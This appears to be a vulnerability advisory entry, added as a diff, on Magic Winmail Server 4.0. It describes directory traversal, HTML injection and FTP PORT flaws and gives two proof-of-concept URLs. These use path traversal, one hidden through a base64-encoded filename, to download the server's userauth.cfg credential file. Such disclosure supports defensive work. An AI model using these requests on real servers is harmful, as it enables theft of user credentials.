@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/12388/info
+
+Magic Winmail Server is reportedly affected by multiple vulnerabilities.
+
+There are two distinct directory traversal vulnerabilities in the Webmail interface allowing both arbitrary file downloads and uploads. There is also a HTML injection vulnerability in the Webmail interface that could lead to the theft of the administrator's session cookie.
+
+There are several directory traversal vulnerabilities in the IMAP service commands which could permit a malicious user to read arbitrary emails, create or delete arbitrary files on the server and possibly retrieve arbitrary files from the server.
+
+Magic Winmail Server's FTP service also reportedly fails to properly verify the IP address supplied by a user in a PORT command.
+
+Magic Winmail Server version 4.0 (Build 1112) is reportedly affected by these issues; earlier versions may also be vulnerable. 
+
+http://www.example.com:6080/download.php?
+sid=656041e927559a2ff& // this must be the current session id
+tid=0&folder=INBOX&ix=0&part=1&optype=download&type=nonmime&filename=Ly4uLy4uLy4uLy4uL3VzZXJhdXRoLmNmZw==
+
+// Note Ly4uLy4uLy4uLy4uL3VzZXJhdXRoLmNmZw== is the base64 encoding of /../../../../userauth.cfg
+
+http://www.example.com:6080/download.php?
+sid=656041e927559a2ff&
+tid=0&folder=INBOX&ix=0&part=1&optype=download&cache=1&filename=/../../../../userauth.cfg
